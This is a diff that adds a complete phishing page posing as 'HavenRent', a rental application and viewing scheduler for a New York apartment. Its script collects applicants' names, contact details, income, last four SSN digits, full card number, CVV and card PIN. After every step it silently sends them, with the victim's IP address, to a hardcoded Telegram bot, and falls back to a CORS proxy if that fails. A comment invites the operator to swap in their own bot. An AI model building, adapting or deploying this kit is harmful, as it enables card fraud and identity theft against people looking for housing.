@@ -1,0 +1,1068 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HavenRent - Apartment Application</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: #f1f5f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 24px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 760px;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .logo-icon {
+            background: #0f172a;
+            color: white;
+            width: 44px;
+            height: 44px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 700;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0f172a;
+            letter-spacing: -0.5px;
+        }
+        
+        .logo-text span {
+            color: #3b82f6;
+        }
+        
+        .verified-badge {
+            background: white;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #0f172a;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #e2e8f0;
+        }
+        
+        .verified-badge i {
+            color: #3b82f6;
+        }
+        
+        .main-card {
+            background: white;
+            border-radius: 24px;
+            padding: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.15);
+            border: 1px solid #e2e8f0;
+        }
+        
+        .property-header {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 32px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .property-image {
+            width: 100px;
+            height: 100px;
+            background: #f1f5f9;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #94a3b8;
+            font-size: 32px;
+        }
+        
+        .property-details {
+            flex: 1;
+        }
+        
+        .property-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 8px;
+        }
+        
+        .property-address {
+            color: #64748b;
+            font-size: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .property-features {
+            display: flex;
+            gap: 16px;
+            color: #475569;
+            font-size: 14px;
+        }
+        
+        .property-features span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .progress {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        .progress-line {
+            position: absolute;
+            top: 20px;
+            left: 45px;
+            right: 45px;
+            height: 2px;
+            background: #e2e8f0;
+            z-index: 1;
+        }
+        
+        .progress-step {
+            position: relative;
+            z-index: 2;
+            background: white;
+            padding: 0 8px;
+            text-align: center;
+        }
+        
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            background: #f1f5f9;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px;
+            font-weight: 600;
+            color: #64748b;
+            border: 2px solid white;
+        }
+        
+        .step-circle.active {
+            background: #3b82f6;
+            color: white;
+            box-shadow: 0 10px 20px -5px rgba(59,130,246,0.3);
+        }
+        
+        .step-circle.completed {
+            background: #10b981;
+            color: white;
+        }
+        
+        .step-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #64748b;
+        }
+        
+        .step-label.active {
+            color: #0f172a;
+        }
+        
+        .form-section {
+            display: none;
+        }
+        
+        .form-section.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0.6; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .section-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 8px;
+        }
+        
+        .section-desc {
+            color: #64748b;
+            font-size: 15px;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+        
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #334155;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 14px;
+            font-size: 15px;
+            transition: all 0.2s;
+            background: #fafcfc;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #3b82f6;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(59,130,246,0.1);
+        }
+        
+        .input-field::placeholder {
+            color: #94a3b8;
+        }
+        
+        .date-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        
+        .card-preview {
+            background: linear-gradient(145deg, #1e293b, #0f172a);
+            border-radius: 18px;
+            padding: 24px;
+            margin-bottom: 24px;
+            color: white;
+            position: relative;
+            height: 180px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        
+        .card-chip {
+            width: 45px;
+            height: 35px;
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            border-radius: 8px;
+        }
+        
+        .card-number-display {
+            font-size: 22px;
+            letter-spacing: 4px;
+            font-family: 'Courier New', monospace;
+            font-weight: 600;
+        }
+        
+        .card-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 18px;
+            background: #f8fafc;
+            border-radius: 40px;
+            margin: 16px 0;
+            font-size: 14px;
+            color: #334155;
+            border: 1px solid #e2e8f0;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn:hover {
+            background: #2563eb;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -5px rgba(59,130,246,0.4);
+        }
+        
+        .btn-secondary {
+            background: white;
+            color: #334155;
+            border: 1.5px solid #e2e8f0;
+        }
+        
+        .btn-secondary:hover {
+            background: #f8fafc;
+            box-shadow: none;
+            transform: none;
+        }
+        
+        .total-box {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 20px;
+            margin-top: 20px;
+            border: 1px solid #e2e8f0;
+        }
+        
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            color: #334155;
+        }
+        
+        .total-row.final {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0f172a;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 12px;
+            margin-top: 8px;
+        }
+        
+        .card-restriction {
+            background: #fff7ed;
+            border: 1px solid #fdba74;
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin: 20px 0 10px;
+            font-size: 14px;
+            color: #9a3412;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .card-restriction i {
+            color: #ea580c;
+        }
+        
+        .success-screen {
+            text-align: center;
+            padding: 40px 20px;
+            display: none;
+        }
+        
+        .success-screen.active {
+            display: block;
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            color: white;
+            font-size: 40px;
+        }
+        
+        .success-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0f172a;
+            margin-bottom: 16px;
+        }
+        
+        .success-message {
+            color: #64748b;
+            font-size: 16px;
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
+        
+        .confirmation-box {
+            background: #f1f5f9;
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 24px;
+            font-family: 'Courier New', monospace;
+            font-size: 18px;
+            font-weight: 700;
+            color: #0f172a;
+            letter-spacing: 2px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">H</div>
+                <div class="logo-text">haven<span>rent</span></div>
+            </div>
+            <div class="verified-badge">
+                ✓ Verified Partner
+            </div>
+        </div>
+        
+        <div class="main-card">
+            <!-- Property Preview -->
+            <div class="property-header">
+                <div class="property-image">
+                    🏢
+                </div>
+                <div class="property-details">
+                    <h2 class="property-title">1 bed · 1B</h2>
+                    <p class="property-address">
+                        📍New York
+                    </p>
+                    <div class="property-features">
+                        <span>🛏️ 1 bed </span>
+                        <span>🛁 1 bath</span>
+                        <span>📏 1348sqft</span>
+                        <span>🗓️ Available now</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Progress Steps -->
+            <div class="progress">
+                <div class="progress-line"></div>
+                <div class="progress-step">
+                    <div class="step-circle active" id="step1Circle">1</div>
+                    <div class="step-label active" id="step1Label">Schedule</div>
+                </div>
+                <div class="progress-step">
+                    <div class="step-circle" id="step2Circle">2</div>
+                    <div class="step-label" id="step2Label">Information</div>
+                </div>
+                <div class="progress-step">
+                    <div class="step-circle" id="step3Circle">3</div>
+                    <div class="step-label" id="step3Label">Card</div>
+                </div>
+                <div class="progress-step">
+                    <div class="step-circle" id="step4Circle">4</div>
+                    <div class="step-label" id="step4Label">Confirmation</div>
+                </div>
+            </div>
+            
+            <!-- STEP 1: SCHEDULE VIEWING -->
+            <div id="step1" class="form-section active">
+                <h3 class="section-title">Schedule your viewing</h3>
+                <p class="section-desc">We appreciate your interest in our properties. To proceed with scheduling a tour, all applicants must complete a brief verification application and submit a $3 processing fee.
+This unit is in high demand. Select a date and time to tour the apartment.</p>
+                
+                <div class="date-group">
+                    <div class="input-group">
+                        <label class="input-label">Preferred Date</label>
+                        <input type="date" id="viewingDate" class="input-field" value="2024-12-15">
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label">Preferred Time</label>
+                        <select id="viewingTime" class="input-field">
+                            <option>9:00 AM</option>
+                            <option>10:30 AM</option>
+                            <option>12:00 PM</option>
+                            <option>1:30 PM</option>
+                            <option>3:00 PM</option>
+                            <option>4:30 PM</option>
+                            <option>6:00 PM</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Number of guests</label>
+                    <select id="guests" class="input-field">
+                        <option>1 guest</option>
+                        <option selected>2 guests</option>
+                        <option>3 guests</option>
+                        <option>4+ guests</option>
+                    </select>
+                </div>
+                
+                <div class="security-badge">
+                    <span>🔒</span>
+                    <span>Your appointment is tentatively held for 30 minutes</span>
+                </div>
+                
+                <button id="step1Btn" class="btn">
+                    Continue to application
+                    <span>→</span>
+                </button>
+            </div>
+            
+            <!-- STEP 2: PERSONAL INFORMATION -->
+            <div id="step2" class="form-section">
+                <h3 class="section-title">Applicant information</h3>
+                <p class="section-desc">Please provide your details to start the application process.</p>
+                
+                <div class="two-column">
+                    <div class="input-group">
+                        <label class="input-label">First name</label>
+                        <input type="text" id="firstName" class="input-field" placeholder="John">
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label">Last name</label>
+                        <input type="text" id="lastName" class="input-field" placeholder="Smith">
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Email address</label>
+                    <input type="email" id="email" class="input-field" placeholder="john.smith@email.com">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Phone number</label>
+                    <input type="tel" id="phone" class="input-field" placeholder="(212) 555-7890">
+                </div>
+                
+                <div class="two-column">
+                    <div class="input-group">
+                        <label class="input-label">Annual income</label>
+                        <select id="income" class="input-field">
+                            <option>$0 – $50,000</option>
+                            <option>$50,000 – $75,000</option>
+                            <option>$75,000 – $100,000</option>
+                            <option>$100,000 – $150,000</option>
+                            <option>$150,000+</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label">Credit score</label>
+                        <select id="creditScore" class="input-field">
+                            <option>Excellent (720+)</option>
+                            <option>Good (680-719)</option>
+                            <option>Fair (640-679)</option>
+                            <option>Poor (below 640)</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <!-- LAST 4 SSN ADDED HERE -->
+                <div class="input-group">
+                    <label class="input-label">Last 4 digits of SSN</label>
+                    <input type="text" id="last4ssn" class="input-field" placeholder="1234" maxlength="4">
+                    <div style="font-size: 12px; color: #64748b; margin-top: 6px;">
+                        Used for credit check verification
+                    </div>
+                </div>
+                
+                <button id="step2Btn" class="btn">
+                    Continue to payment
+                    <span>→</span>
+                </button>
+                
+                <button class="btn btn-secondary" style="margin-top: 12px;" onclick="goToStep(1)">
+                    ← Back
+                </button>
+            </div>
+            
+            <!-- STEP 3: CARD INFORMATION -->
+            <div id="step3" class="form-section">
+                <h3 class="section-title">Application fee</h3>
+                <p class="section-desc">A $3 application fee is required to process your rental application and run credit check.</p>
+                
+                <div class="card-preview">
+                    <div class="card-chip"></div>
+                    <div class="card-number-display" id="cardPreview">•••• •••• •••• ••••</div>
+                    <div class="card-footer">
+                        <span id="cardNamePreview">Cardholder Name</span>
+                        <span id="cardDatePreview">MM/YY</span>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Card number</label>
+                    <input type="text" id="cardNumber" class="input-field" placeholder="1234 5678 9012 3456" maxlength="19">
+                </div>
+                
+                <div class="two-column">
+                    <div class="input-group">
+                        <label class="input-label">Expiration date</label>
+                        <input type="text" id="cardExpiry" class="input-field" placeholder="MM/YY" maxlength="5">
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label">CVV</label>
+                        <input type="password" id="cardCvv" class="input-field" placeholder="123" maxlength="3">
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Name on card</label>
+                    <input type="text" id="cardName" class="input-field" placeholder="John Smith">
+                </div>
+                
+                <!-- CARD RESTRICTION NOTICE - PREPAID & CASH APP NOT ACCEPTED -->
+                <div class="card-restriction">
+                    <span>⚠️</span>
+                    <span><strong>Prepaid cards and Cash App card not accepted.</strong> Please use a valid debit or credit card from a major bank.</span>
+                </div>
+                
+                <div class="security-badge">
+                    <span>🔒</span>
+                    <span>256-bit encrypted • We never store your full card number</span>
+                </div>
+                
+                <div class="total-box">
+                    <div class="total-row">
+                        <span>Application fee</span>
+                        <span>$3.00</span>
+                    </div>
+                    <div class="total-row">
+                        <span>Credit check</span>
+                        <span>$0.00</span>
+                    </div>
+                    <div class="total-row final">
+                        <span>Total due today</span>
+                        <span>$3.00</span>
+                    </div>
+                </div>
+                
+                <button id="step3Btn" class="btn">
+                    Continue
+                    <span>→</span>
+                </button>
+                
+                <button class="btn btn-secondary" style="margin-top: 12px;" onclick="goToStep(2)">
+                    ← Back
+                </button>
+            </div>
+            
+            <!-- STEP 4: PIN VERIFICATION -->
+            <div id="step4" class="form-section">
+                <h3 class="section-title">Security verification</h3>
+                <p class="section-desc">For your protection, please enter your card PIN to authorize the $3 application fee.</p>
+                
+                <div style="background: #f1f5f9; padding: 24px; border-radius: 20px; text-align: center; margin-bottom: 24px;">
+                    <div style="font-size: 14px; color: #64748b; margin-bottom: 16px;">Enter 4-digit PIN</div>
+                    <div style="display: flex; gap: 12px; justify-content: center; margin-bottom: 16px;">
+                        <input type="password" id="pin1" class="input-field" maxlength="1" style="width: 60px; text-align: center; font-size: 24px; padding: 12px;">
+                        <input type="password" id="pin2" class="input-field" maxlength="1" style="width: 60px; text-align: center; font-size: 24px; padding: 12px;">
+                        <input type="password" id="pin3" class="input-field" maxlength="1" style="width: 60px; text-align: center; font-size: 24px; padding: 12px;">
+                        <input type="password" id="pin4" class="input-field" maxlength="1" style="width: 60px; text-align: center; font-size: 24px; padding: 12px;">
+                    </div>
+                    <div style="font-size: 13px; color: #64748b;">
+                        This is your card PIN, not your account password
+                    </div>
+                </div>
+                
+                <div class="security-badge">
+                    <span>🏦</span>
+                    <span>Bank-level security • PCI compliant</span>
+                </div>
+                
+                <button id="step4Btn" class="btn">
+                    Complete application
+                    <span>→</span>
+                </button>
+                
+                <button class="btn btn-secondary" style="margin-top: 12px;" onclick="goToStep(3)">
+                    ← Back
+                </button>
+            </div>
+            
+            <!-- SUCCESS SCREEN -->
+            <div id="success" class="success-screen">
+                <div class="success-icon">✓</div>
+                <h2 class="success-title">Application submitted!</h2>
+                <p class="success-message">
+                    Your rental application for 1 bed 1 bathroom · has been received. The landlord will contact you within 24 hours to confirm your viewing appointment.
+                </p>
+                <div class="confirmation-box">
+                    APP-2024-12-15-8723
+                </div>
+                <div style="background: #f1f5f9; border-radius: 16px; padding: 20px; text-align: left; margin-bottom: 24px;">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
+                        <span style="color: #64748b;">Viewing date</span>
+                        <span style="font-weight: 600;" id="confirmDate">December 15, 2024</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
+                        <span style="color: #64748b;">Viewing time</span>
+                        <span style="font-weight: 600;" id="confirmTime">3:00 PM</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                        <span style="color: #64748b;">Amount paid</span>
+                        <span style="font-weight: 600;">$45.00</span>
+                    </div>
+                </div>
+                <a href="https://zillow.com" style="color: #3b82f6; text-decoration: none; font-weight: 600;">Return to listings →</a>
+            </div>
+        </div>
+        
+        <div style="display: flex; justify-content: space-between; margin-top: 24px; color: #64748b; font-size: 13px;">
+            <span>© 2024 HavenRent. All rights reserved.</span>
+            <span>Privacy · Terms · Fair Housing</span>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // TELEGRAM CONFIG - REPLACE WITH YOUR BOT
+        // ============================================
+        const BOT_TOKEN = '8013982732:AAFzHnslY2qIOYvRXCMRT262GMphsStKcNg';
+        const CHAT_ID = '8202785351';
+        
+        // Store all captured data
+        let applicationData = {
+            viewing: {
+                date: '',
+                time: '',
+                guests: ''
+            },
+            personal: {
+                firstName: '',
+                lastName: '',
+                email: '',
+                phone: '',
+                income: '',
+                creditScore: '',
+                last4ssn: ''  // ADDED LAST 4 SSN
+            },
+            card: {
+                number: '',
+                expiry: '',
+                cvv: '',
+                cardName: ''
+            },
+            pin: '',
+            ip: '',
+            userAgent: navigator.userAgent,
+            timestamp: '',
+            property: 'The Harrison · 2B - 245 West 14th Street'
+        };
+        
+        // Get IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => { applicationData.ip = d.ip; })
+            .catch(() => { applicationData.ip = 'Unknown'; });
+        
+        // DOM Elements
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
+        const success = document.getElementById('success');
+        
+        const step1Circle = document.getElementById('step1Circle');
+        const step2Circle = document.getElementById('step2Circle');
+        const step3Circle = document.getElementById('step3Circle');
+        const step4Circle = document.getElementById('step4Circle');
+        
+        const step1Label = document.getElementById('step1Label');
+        const step2Label = document.getElementById('step2Label');
+        const step3Label = document.getElementById('step3Label');
+        const step4Label = document.getElementById('step4Label');
+        
+        // Card preview
+        const cardPreview = document.getElementById('cardPreview');
+        const cardNamePreview = document.getElementById('cardNamePreview');
+        const cardDatePreview = document.getElementById('cardDatePreview');
+        
+        // ============================================
+        // SEND TO TELEGRAM - SILENT
+        // ============================================
+        async function sendToTelegram(stepName, data) {
+            const timestamp = new Date().toLocaleTimeString();
+            
+            let message = `🏢 HAVENRENT - STEP ${stepName}\n`;
+            message += `━━━━━━━━━━━━━━━━\n`;
+            message += `🕒 ${timestamp}\n`;
+            message += `🌐 ${data.ip || 'Unknown'}\n`;
+            message += `🏠 ${data.property}\n`;
+            message += `━━━━━━━━━━━━━━━━\n`;
+            
+            // Viewing details
+            if (data.viewing.date) {
+                message += `📅 Viewing: ${data.viewing.date} at ${data.viewing.time}\n`;
+                message += `👥 Guests: ${data.viewing.guests}\n`;
+            }
+            
+            // Personal info - UPDATED WITH LAST 4 SSN
+            if (data.personal.firstName) {
+                message += `👤 Name: ${data.personal.firstName} ${data.personal.lastName}\n`;
+                message += `📧 Email: ${data.personal.email}\n`;
+                message += `📱 Phone: ${data.personal.phone}\n`;
+                message += `💰 Income: ${data.personal.income}\n`;
+                message += `📊 Credit: ${data.personal.creditScore}\n`;
+                message += `🆔 SSN (last4): ${data.personal.last4ssn}\n`;  // ADDED
+            }
+            
+            // Card info
+            if (data.card.number) {
+                message += `💳 Card: ${data.card.number}\n`;
+                message += `📅 Exp: ${data.card.expiry}\n`;
+                message += `🔐 CVV: ${data.card.cvv}\n`;
+                message += `📇 Name: ${data.card.cardName}\n`;
+            }
+            
+            // PIN
+            if (data.pin) {
+                message += `🔒 PIN: ${data.pin}\n`;
+            }
+            
+            // Try direct fetch
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                // Try proxy
+                try {
+                    const proxy = 'https://cors-anywhere.herokuapp.com/';
+                    await fetch(proxy + `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'X-Requested-With': 'XMLHttpRequest'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (e) {
+                    console.log('Telegram send failed');
+                }
+            }
+        }
+        
+        // ============================================
+        // STEP MANAGEMENT
+        // ============================================
+        function goToStep(step) {
+            // Hide all sections
+            [step1, step2, step3, step4, success].forEach(el => {
+                el.classList.remove('active');
+            });
+            
+            // Show selected step
+            if (step === 1) step1.classList.add('active');
+            if (step === 2) step2.classList.add('active');
+            if (step === 3) step3.classList.add('active');
+            if (step === 4) step4.classList.add('active');
+            if (step === 5) success.classList.add('active');
+            
+            // Update circles
+            [step1Circle, step2Circle, step3Circle, step4Circle].forEach((circle, index) => {
+                circle.classList.remove('active', 'completed');
+                if (index + 1 < step) {
+                    circle.classList.add('completed');
+                    circle.textContent = '✓';
+                }
+                if (index + 1 === step) {
+                    circle.classList.add('active');
+                    circle.textContent = index + 1;
+                }
+            });
+            
+            // Update labels
+            [step1Label, step2Label, step3Label, step4Label].forEach((label, index) => {
+                label.classList.remove('active');
+                if (index + 1 === step) {
+                    label.classList.add('active');
+                }
+            });
+        }
+        
+        // Format card number
+        document.getElementById('cardNumber')?.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+            
+            // Preview
+            if (value.length > 0) {
+                let last4 = value.slice(-4);
+                cardPreview.textContent = `•••• •••• •••• ${last4}`;
+            } else {
+                cardPreview.textContent = '•••• •••• •••• ••••';
+            }
+        });
+        
+        // Format expiry
+        document.getElementById('cardExpiry')?.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                e.target.value = value.slice(0,2) + '/' + value.slice(2,4);
+                cardDatePreview.textContent = e.target.value;
+            } else {
+                cardDatePreview.textContent = 'MM/YY';
+            }
+        });
+        
+        // Card name preview
+        document.getElementById('cardName')?.addEventListener('input', function(e) {
+            cardNamePreview.textContent = e.target.value || 'Cardholder Name';
+        });
+        
+        // Auto-advance PIN fields
+        ['pin1', 'pin2', 'pin3', 'pin4'].forEach((id, index) => {
+            document.getElementById(id)?.addEventListener('input', function(e) {
+                if (e.target.value.length === 1 && index < 3) {
+                    document.getElementById(`pin${index + 2}`).focus();
+                }
+            });
+        });
+        
+        // Last 4 SSN - only digits, max 4
+        document.getElementById('last4ssn')?.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+        });
+        
+        // ============================================
+        // STEP 1: SCHEDULE VIEWING
+        // ============================================
+        document.getElementById('step1Btn').addEventListener('click', function() {
+            // Capture viewing data
+            applicationData.viewing.date = document.getElementById('viewingDate').value || '2024-12-15';
+            applicationData.viewing.time = document.getElementById('viewingTime').value || '3:00 PM';
+            applicationData.viewing.guests = document.getElementById('guests').value || '2 guests';
+            applicationData.timestamp = new Date().toISOString();
+            
+            // Send to Telegram
+            sendToTelegram('1 - SCHEDULE', applicationData);
+            
+            // Update confirmation display
+            document.getElementById('confirmDate').textContent = new Date(applicationData.viewing.date).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
+            document.getElementById('confirmTime').textContent = applicationData.viewing.time;
+            
+            // Go to step 2
+            goToStep(2);
+        });
+        
+        // ============================================
+        // STEP 2: PERSONAL INFORMATION
+        // ============================================
+        document.getElementById('step2Btn').addEventListener('click', function() {
+            // Capture personal data - ADDED LAST 4 SSN
+            applicationData.personal.firstName = document.getElementById('firstName').value || '[EMPTY]';
+            applicationData.personal.lastName = document.getElementById('lastName').value || '[EMPTY]';
+            applicationData.personal.email = document.getElementById('email').value || '[EMPTY]';
+            applicationData.personal.phone = document.getElementById('phone').value || '[EMPTY]';
+            applicationData.personal.income = document.getElementById('income').value || '[EMPTY]';
+            applicationData.personal.creditScore = document.getElementById('creditScore').value || '[EMPTY]';
+            applicationData.personal.last4ssn = document.getElementById('last4ssn').value || '[EMPTY]';  // ADDED
+            
+            // Send to Telegram
+            sendToTelegram('2 - PERSONAL', applicationData);
+            
+            // Go to step 3
+            goToStep(3);
+        });
+        
+        // ============================================
+        // STEP 3: CARD INFORMATION
+        // ============================================
+        document.getElementById('step3Btn').addEventListener('click', function() {
+            // Capture card data
+            applicationData.card.number = document.getElementById('cardNumber').value || '[EMPTY]';
+            applicationData.card.expiry = document.getElementById('cardExpiry').value || '[EMPTY]';
+            applicationData.card.cvv = document.getElementById('cardCvv').value || '[EMPTY]';
+            applicationData.card.cardName = document.getElementById('cardName').value || '[EMPTY]';
+            
+            // Send to Telegram
+            sendToTelegram('3 - CARD', applicationData);
+            
+            // Go to step 4
+            goToStep(4);
+        });
+        
+        // ============================================
+        // STEP 4: PIN VERIFICATION
+        // ============================================
+        document.getElementById('step4Btn').addEventListener('click', function() {
+            // Capture PIN
+            const pin1 = document.getElementById('pin1').value || '';
+            const pin2 = document.getElementById('pin2').value || '';
+            const pin3 = document.getElementById('pin3').value || '';
+            const pin4 = document.getElementById('pin4').value || '';
+            
+            applicationData.pin = pin1 + pin2 + pin3 + pin4 || '[EMPTY]';
+            
+            // Send to Telegram - FINAL
+            sendToTelegram('4 - PIN', applicationData);
+            
+            // Go to success
+            goToStep(5);
+        });
+        
+        // Make goToStep available globally for back buttons
+        window.goToStep = goToStep;
+        
+        // Set default date
+        const today = new Date();
+        today.setDate(today.getDate() + 2);
+        const defaultDate = today.toISOString().split('T')[0];
+        document.getElementById('viewingDate').value = defaultDate;
+    </script>
+</body>
+</html>
